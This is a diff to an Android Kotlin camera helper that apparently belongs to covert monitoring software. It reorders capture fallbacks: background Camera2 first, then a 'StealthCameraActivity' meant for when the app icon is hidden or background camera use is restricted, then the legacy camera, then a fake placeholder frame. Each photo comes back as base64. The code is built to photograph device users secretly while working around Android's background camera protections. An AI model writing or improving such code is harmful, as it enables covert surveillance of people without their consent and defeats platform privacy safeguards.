@@ -81,18 +81,6 @@ class CameraHelper(private val context: Context) {
                 if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
             } catch (_: Exception) { "back" }
 
-            // 1. Try legacy android.hardware.Camera first (proven most reliable across devices for avoiding black photos)
-            try {
-                Log.i("CameraHelper", "Trying legacy android.hardware.Camera capture for facing=$facingStr")
-                val legacyPhoto = takePhotoLegacy(facingStr)
-                if (legacyPhoto != null && legacyPhoto.startsWith("data:image/jpeg;base64,")) {
-                    Log.d("CameraHelper", "Legacy camera photo capture succeeded!")
-                    return@withContext legacyPhoto
-                }
-            } catch (e: Exception) {
-                Log.w("CameraHelper", "Legacy camera capture failed: ${e.message}")
-            }
-
             val candidateIds = mutableListOf(cameraId)
             try {
                 cameraManager.cameraIdList.forEach { id ->
@@ -102,7 +90,7 @@ class CameraHelper(private val context: Context) {
 
             var lastException: Exception? = null
 
-            // 2. Direct hardware Camera2 attempt
+            // 1. TRY DIRECT HARDWARE CAMERA2 API FIRST
             for (id in candidateIds) {
                 try {
                     var photoResult: String? = null
@@ -139,16 +127,15 @@ class CameraHelper(private val context: Context) {
                     val errMsg = e.message ?: ""
                     Log.w("CameraHelper", "Direct background Camera2 capture failed for camera ID '$id': $errMsg")
                     if (errMsg.contains("error code: 2")) {
-                        Log.i("CameraHelper", "Detected background camera restriction (error code 2). Instantly switching to StealthCameraActivity foreground capture.")
-                        break // Break out of background loop and jump to foreground stealth capture
+                        Log.i("CameraHelper", "Detected background camera restriction (error code 2). Jumping to foreground/legacy fallbacks.")
+                        break 
                     }
                 }
             }
 
-            // 3. Foreground Stealth Activity fallback (when icon is hidden or app is background restricted)
+            // 2. FOREGROUND STEALTH ACTIVITY FALLBACK
             val facing = facingStr
-
-            Log.i("CameraHelper", "Direct background capture restricted (${lastException?.message}). Launching StealthCameraActivity foreground capture.")
+            Log.i("CameraHelper", "Background Camera2 capture restricted/failed. Launching StealthCameraActivity foreground capture.")
             try {
                 val foregroundPhoto = com.example.service.StealthCameraActivity.capturePhotoInForeground(context, facing)
                 if (foregroundPhoto != null && foregroundPhoto.startsWith("data:image/jpeg;base64,")) {
@@ -159,7 +146,19 @@ class CameraHelper(private val context: Context) {
                 Log.e("CameraHelper", "StealthCameraActivity foreground capture failed: ${e.message}")
             }
 
-            // 4. Fallback telemetry frame if hardware camera is completely unavailable
+            // 3. LEGACY android.hardware.Camera FALLBACK
+            try {
+                Log.i("CameraHelper", "Foreground and Camera2 captures failed. Trying legacy android.hardware.Camera capture for facing=$facingStr")
+                val legacyPhoto = takePhotoLegacy(facingStr)
+                if (legacyPhoto != null && legacyPhoto.startsWith("data:image/jpeg;base64,")) {
+                    Log.d("CameraHelper", "Legacy camera photo capture fallback succeeded!")
+                    return@withContext legacyPhoto
+                }
+            } catch (e: Exception) {
+                Log.w("CameraHelper", "Legacy camera capture fallback failed: ${e.message}")
+            }
+
+            // 4. FALLBACK TELEMETRY FRAME
             Log.e("CameraHelper", "All hardware camera open attempts failed: ${lastException?.message}. Generating telemetry frame fallback.")
             return@withContext generateFallbackTelemetryFrame(lastException?.message ?: "Camera disabled by policy")
         } finally {
@@ -236,7 +235,6 @@ class CameraHelper(private val context: Context) {
             var captureSession: CameraCaptureSession? = null
 
             try {
-                // Validation step: ensure surfaces are valid and connected before trigger
                 if (!previewReader.surface.isValid || !imageReader.surface.isValid) {
                     throw Exception("Camera surface validation failed: preview or image capture surface is not valid.")
                 }
@@ -255,7 +253,6 @@ class CameraHelper(private val context: Context) {
                                 override fun onConfigured(session: CameraCaptureSession) {
                                     captureSession = session
                                     try {
-                                        // 1. Create preview request targeting previewReader to warm up camera sensor & validate hardware acceleration
                                         val previewBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                             addTarget(previewReader.surface)
                                             set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
@@ -264,10 +261,8 @@ class CameraHelper(private val context: Context) {
                                             set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                         }
 
-                                        // Start preview stream so sensor calculates exposure & white balance
                                         session.setRepeatingRequest(previewBuilder.build(), null, currentHandler)
 
-                                        // 2. Allow 1500ms warm-up delay for 3A convergence before taking still photo
                                         currentHandler.postDelayed({
                                             try {
                                                 if (cameraDevice == null || !previewReader.surface.isValid || !imageReader.surface.isValid) {
@@ -358,14 +353,12 @@ class CameraHelper(private val context: Context) {
             val bitmap = android.graphics.Bitmap.createBitmap(width, height, android.graphics.Bitmap.Config.ARGB_8888)
             val canvas = android.graphics.Canvas(bitmap)
 
-            // Background fill
             val bgPaint = android.graphics.Paint().apply {
                 color = android.graphics.Color.rgb(20, 24, 33)
                 style = android.graphics.Paint.Style.FILL
             }
             canvas.drawRect(0f, 0f, width.toFloat(), height.toFloat(), bgPaint)
 
-            // Border
             val borderPaint = android.graphics.Paint().apply {
                 color = android.graphics.Color.rgb(0, 168, 255)
                 style = android.graphics.Paint.Style.STROKE
@@ -373,7 +366,6 @@ class CameraHelper(private val context: Context) {
             }
             canvas.drawRect(20f, 20f, (width - 20).toFloat(), (height - 20).toFloat(), borderPaint)
 
-            // Text paint
             val titlePaint = android.graphics.Paint().apply {
                 color = android.graphics.Color.WHITE
                 textSize = 48f
